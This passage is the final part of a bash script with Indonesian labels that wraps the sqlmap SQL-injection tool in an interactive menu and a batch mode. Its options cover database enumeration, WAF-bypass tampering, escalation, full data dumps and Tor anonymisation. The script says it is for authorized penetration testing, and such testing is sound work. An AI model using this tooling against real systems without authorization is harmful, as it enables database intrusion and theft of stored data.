    2) Toggle --smart         (sekarang: $([[ $USE_SMART == 1 ]] && echo ON || echo OFF))
    3) Toggle --keep-alive    (sekarang: $([[ $USE_KEEP_ALIVE == 1 ]] && echo ON || echo OFF))
    4) Toggle --hex           (sekarang: $([[ $USE_HEX == 1 ]] && echo ON || echo OFF))
    5) Set --dbms             (sekarang: ${DBMS:-<auto>})
    6) Set --csrf-token & --csrf-url
    7) Set --eval (ekspresi dinamis)
    8) Set extra args         (sekarang: ${EXTRA_ARGS:-<kosong>})
    9) Reset sesi
    0) Kembali
EOF
  local p
  p="$(ask 'Pilih [0-9]' '0')"
  case "$p" in
    1) [[ $USE_PARSE_ERRORS == 1 ]] && USE_PARSE_ERRORS=0 || USE_PARSE_ERRORS=1
       echo "  ${OK} parse-errors=$USE_PARSE_ERRORS" ;;
    2) [[ $USE_SMART == 1 ]] && USE_SMART=0 || USE_SMART=1
       echo "  ${OK} smart=$USE_SMART" ;;
    3) [[ $USE_KEEP_ALIVE == 1 ]] && USE_KEEP_ALIVE=0 || USE_KEEP_ALIVE=1
       echo "  ${OK} keep-alive=$USE_KEEP_ALIVE" ;;
    4) [[ $USE_HEX == 1 ]] && USE_HEX=0 || USE_HEX=1
       echo "  ${OK} hex=$USE_HEX" ;;
    5) DBMS="$(ask 'DBMS (mysql/mssql/postgresql/oracle/sqlite, kosong=auto)')" ;;
    6) CSRF_TOKEN="$(ask 'Nama parameter CSRF token')"
       CSRF_URL="$(ask 'URL sumber token')" ;;
    7) EVAL_EXPR="$(ask 'Ekspresi Python (mis. token=hashlib.md5(...).hexdigest())')" ;;
    8) EXTRA_ARGS="$(ask 'Extra args')" ;;
    9) rm -f "$SESSION_FILE"; echo "  ${OK} Sesi direset." ;;
    0) return ;;
    *) echo "  ${ERR} Tidak valid." ;;
  esac
}

# -----------------------------------------------------------------------------
# 12. EXPORT LAPORAN
# -----------------------------------------------------------------------------
export_report() {
  banner "12. EXPORT LAPORAN"
  local ts fmt out
  ts="$(date '+%Y%m%d_%H%M%S')"
  fmt="$(ask 'Format [md/txt]' 'md')"
  out="$(ask 'File output' "sqlmap_report_${ts}.${fmt}")"

  {
    echo "# $TOOL_NAME Report"
    echo
    echo "> **by $AUTHOR** · $TOOL_NAME v$VERSION"
    echo
    echo "---"
    echo
    echo "## Metadata"
    echo
    echo "| Field | Value |"
    echo "|-------|-------|"
    echo "| Tool | \`$TOOL_NAME v$VERSION\` |"
    echo "| Author | \`$AUTHOR\` |"
    echo "| Tanggal | $(date '+%Y-%m-%d %H:%M:%S') |"
    echo "| sqlmap | \`$(sqlmap --version 2>/dev/null | head -n1 || echo unknown)\` |"
    echo "| Host | \`$(hostname)\` |"
    echo "| User | \`$(whoami)\` |"
    echo "| Environment | $([[ $IS_TERMUX == 1 ]] && echo Termux || echo Linux/macOS) |"
    echo
    echo "## Target"
    echo
    echo "| Field | Value |"
    echo "|-------|-------|"
    echo "| URL | \`$TARGET_URL\` |"
    echo "| Metode | $TARGET_METHOD |"
    [[ -n "$REQUEST_FILE" ]] && echo "| Request | \`$REQUEST_FILE\` |"
    echo "| Level | $LEVEL |"
    echo "| Risk | $RISK |"
    echo "| Threads | $THREADS |"
    echo "| Time-sec | $TIME_SEC |"
    [[ -n "$DBMS"      ]] && echo "| DBMS | \`$DBMS\` |"
    [[ -n "$TECHNIQUE" ]] && echo "| Teknik | \`$TECHNIQUE\` |"
    [[ -n "$PROXY"     ]] && echo "| Proxy | \`$PROXY\` |"
    [[ "$TOR" == "1"   ]] && echo "| Tor | ON |"
    echo
    echo "## Log Perintah (tail 500)"
    echo
    echo '```'
    tail -n 500 "$LOG_FILE" 2>/dev/null || echo "(log kosong)"
    echo '```'
    echo
    echo "## Output"
    echo
    echo "- Output dir: \`$OUTPUT_DIR\`"
    echo "- Dump dir  : \`$DUMP_DIR\`"
    echo
    echo "---"
    echo
    echo "_Generated by $TOOL_NAME by $AUTHOR_"
  } > "$out"

  echo "  ${OK} Laporan: $out"
  log "INFO" "Report exported: $out"
}

# -----------------------------------------------------------------------------
# MENU UTAMA
# -----------------------------------------------------------------------------
menu() {
  while true; do
    banner "$TOOL_NAME INTERACTIVE CHEAT SHEET v$VERSION"
    printf '  %s Target   : %s\n' "${INFO}" "${TARGET_URL:-<belum diset>}"
    printf '  %s Metode   : %s\n' "${INFO}" "$TARGET_METHOD"
    printf '  %s L/R/T    : %s / %s / %s\n' "${INFO}" "$LEVEL" "$RISK" "$THREADS"
    printf '  %s Time-sec : %s\n' "${INFO}" "$TIME_SEC"
    printf '  %s Output   : %s\n' "${INFO}" "${OUTPUT_DIR:-<belum diset>}"
    printf '  %s Dump     : %s\n' "${INFO}" "${DUMP_DIR:-<belum diset>}"
    [[ "$IS_TERMUX" == "1" ]] && printf '  %s Termux   : wake-lock %s\n' "${INFO}" "$([[ $WAKE_LOCKED == 1 ]] && echo ON || echo OFF)"
    hr
    cat <<EOF
  ${C_CYN}s)${C_RST} Set target (URL manual)
  ${C_CYN}l)${C_RST} Load sesi terakhir
  ${C_CYN}1)${C_RST} Deteksi dasar
  ${C_CYN}2)${C_RST} Enumerasi info DB
  ${C_CYN}3)${C_RST} Enumerasi tabel/kolom/data
  ${C_CYN}4)${C_RST} Teknik spesifik (B/E/U/S/T/Q)
  ${C_CYN}5)${C_RST} WAF bypass (tamper)
  ${C_CYN}6)${C_RST} Eskalasi (izin eksplisit!)
  ${C_CYN}7)${C_RST} Full workflow
  ${C_CYN}d)${C_RST} ${C_BLD}Dump${C_RST} — semua DB / tabel / kolom / data
  ${C_CYN}q)${C_RST} SQL query kustom (--sql-query/--sql-file)
  ${C_CYN}p)${C_RST} Proxy & anonymizer (Burp/Tor/UA)
  ${C_CYN}a)${C_RST} Advanced flags (parse-errors/smart/hex/dbms/csrf)
  ${C_CYN}x)${C_RST} Export laporan
  ${C_CYN}!${C_RST} Keluar
EOF
    hr
    read -rp "  ${C_CYN}${AUTHOR} ▸${C_RST} " choice
    case "$choice" in
      s|S) setup_session ;;
      l|L) load_session || true ;;
      1) detect_basic ;;
      2) enum_db ;;
      3) enum_tables ;;
      4) technique_specific ;;
      5) waf_bypass ;;
      6) escalate ;;
      7) full_workflow ;;
      d|D) menu_dump ;;
      q) sql_query_menu ;;
      p|P) proxy_menu ;;
      a|A) advanced_flags ;;
      x|X) export_report ;;
      "!"|Q|quit|exit) log "INFO" "Exit"; echo "  ${OK} Keluar."; signature; exit 0 ;;
      *) echo "  ${ERR} Pilihan tidak valid." ;;
    esac
  done
}

# -----------------------------------------------------------------------------
# BATCH MODE
# -----------------------------------------------------------------------------
batch_run() {
  local url="${1:-}" mode="${2:-detect}"
  [[ -z "$url" ]] && { echo "Usage: $0 --batch-run <url> [detect|enum|full]"; exit 2; }
  TARGET_URL="$url"
  local host; host="$(echo "$url" | awk -F/ '{print $3}' | tr ':' '_')"
  if [[ "$IS_TERMUX" == "1" ]]; then
    OUTPUT_DIR="$HOME/sqlmap_out/sqlmap_${host}_$(date '+%Y%m%d_%H%M%S')"
    DUMP_DIR="$HOME/sqlmap_dump/sqlmap_${host}_$(date '+%Y%m%d_%H%M%S')"
  else
    OUTPUT_DIR="./out/sqlmap_${host}_$(date '+%Y%m%d_%H%M%S')"
    DUMP_DIR="./dump/sqlmap_${host}_$(date '+%Y%m%d_%H%M%S')"
  fi
  mkdir -p "$OUTPUT_DIR" "$DUMP_DIR"
  acquire_wake_lock
  FLUSH_ONCE=1
  mapfile -t A < <(base_args_core)

  case "$mode" in
    detect) run_cmd sqlmap "${A[@]}" ;;
    enum)   run_cmd sqlmap "${A[@]}" --banner --current-user --current-db --is-dba
            run_cmd sqlmap "${A[@]}" --dbs ;;
    full)   run_cmd sqlmap "${A[@]}" --banner --current-user --current-db --is-dba
            run_cmd sqlmap "${A[@]}" --dbs ;;
    *) echo "Mode tidak dikenal: $mode"; exit 2 ;;
  esac
  release_wake_lock
}

# -----------------------------------------------------------------------------
# USAGE
# -----------------------------------------------------------------------------
usage() {
  echo
  render_art
  echo
  cat <<EOF
$TOOL_NAME v$VERSION — by $AUTHOR
SQLMap Interactive Cheat Sheet (Termux-ready)

Usage:
  $SCRIPT_NAME                          Menu interaktif
  $SCRIPT_NAME --check                  Cek dependency
  $SCRIPT_NAME --load                   Muat sesi terakhir
  $SCRIPT_NAME --batch-run <url> [mode] Batch mode (detect|enum|full)
  $SCRIPT_NAME --help                   Bantuan ini

Fitur:
  - Setup sesi interaktif + output dir per-target
  - Deteksi, enumerasi DB, teknik spesifik, WAF bypass, eskalasi
  - Submenu DUMP lengkap + FULL DUMP (--dump-all)
  - SQL query kustom, proxy & anonymizer, advanced flags
  - Session save/load, export laporan, log perintah
  - Mode batch non-interaktif untuk pipeline
  - Termux (Android): auto-detect, path \$HOME, wake-lock, fallback art

Environment:
  Termux  : pkg install -y python curl git && pip install sqlmap
  Debian  : sudo apt install sqlmap
  macOS   : brew install sqlmap

$AUTHOR — Authorized pentest only. No warranty.
EOF
}

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
main() {
  case "${1:-}" in
    -h|--help) usage; exit 0 ;;
    --check)
      banner "DEPENDENCY CHECK — $TOOL_NAME by $AUTHOR"
      check_deps && echo "  ${OK} Semua dependency utama tersedia." || exit 1
      signature
      exit 0
      ;;
    --load)
      load_session || exit 1
      menu
      exit 0
      ;;
    --batch-run)
      shift; batch_run "$@"; signature; exit $? ;;
    "") ;;
    *) echo "  ${ERR} Opsi tidak dikenal: $1"; usage; exit 2 ;;
  esac

  banner "INISIALISASI — $TOOL_NAME by $AUTHOR"
  check_deps || exit 1
  if [[ -f "$SESSION_FILE" ]]; then
    echo "  ${INFO} Sesi ditemukan: $SESSION_FILE"
    read -rp "  Muat? [Y/n]: " yn
    [[ "${yn,,}" != "n" ]] && load_session || setup_session
  else
    setup_session
  fi
  menu
}

main "$@"